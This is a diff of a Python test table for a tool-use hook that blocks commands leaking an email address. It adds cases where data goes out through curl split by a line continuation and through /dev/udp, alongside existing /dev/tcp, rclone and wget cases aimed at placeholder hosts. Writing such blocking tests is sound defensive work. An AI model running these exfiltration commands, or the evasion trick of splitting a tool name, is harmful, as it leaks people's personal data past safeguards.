@@ -148,6 +148,8 @@ def case_hook_tools(check):
                 ("Write: a path-form block line blocks", "Write", {"file_path": "data/x.csv", "content": "x"}, 2),
                 ("Write: new text is scanned also under a skip line", "Write", {"file_path": "ref/a.md", "content": mail}, 2),
                 ("Bash: git commit after a line continuation blocks", "Bash", {"command": "git -C /p \\\n commit -m " + mail}, 2),
+                ("Bash: a client name split by a line continuation blocks", "Bash", {"command": "cu\\\nrl -d " + mail + " h; git com\\\nmit -m x"}, 2),
+                ("Bash: /dev/udp, wget2, xh and lftp block", "Bash", {"command": "echo " + mail + " > /dev/udp/h/1"}, 2),
                 ("Bash: rclone and /dev/tcp block", "Bash", {"command": "rclone copy x r:" + mail + "; echo " + mail + " > /dev/tcp/h/1"}, 2),
                 ("Bash: a client named by its full path blocks", "Bash", {"command": "/usr/bin/curl -d " + mail + " example.org"}, 2),
                 ("Bash: ./gh and sudo /bin/wget block", "Bash", {"command": "./gh issue create -b " + mail + "; sudo /bin/wget x?" + mail}, 2),
